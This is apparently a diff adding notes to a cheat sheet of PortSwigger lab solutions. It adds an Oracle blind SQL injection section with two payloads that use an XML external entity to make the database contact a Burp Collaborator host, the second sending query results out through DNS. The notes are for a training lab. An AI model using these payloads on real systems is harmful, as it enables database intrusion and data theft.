@@ -16,6 +16,19 @@ You will need [Hackvertor](https://portswigger.net/bappstore/65033cbd2c344fbabe5
   </stockCheck>
 ```
 
+# Lab: Blind SQL injection with out-of-band data exfiltration
+### Identify vulnerability:
+```sql
+aaxaxa'UNION SELECT EXTRACTVALUE(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://x.burpcollaborator.net/"> %remote;]>'),'/l') FROM dual-- 
+```
+Control + U for URL Encoding and SEND
+
+### Data exfiltration
+```sql
+'UNION SELECT EXTRACTVALUE(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://'||(select QUERY HERE')||'.x.burpcollaborator.net/"> %remote;]>'),'/l') FROM dual--
+```
+Control + U for URL Encoding and SEND
+
 # Lab: Exploiting cross-site scripting to steal cookies 
 A simulated victim user views all comments after they are posted.<br>
 Write this payload into comment section:
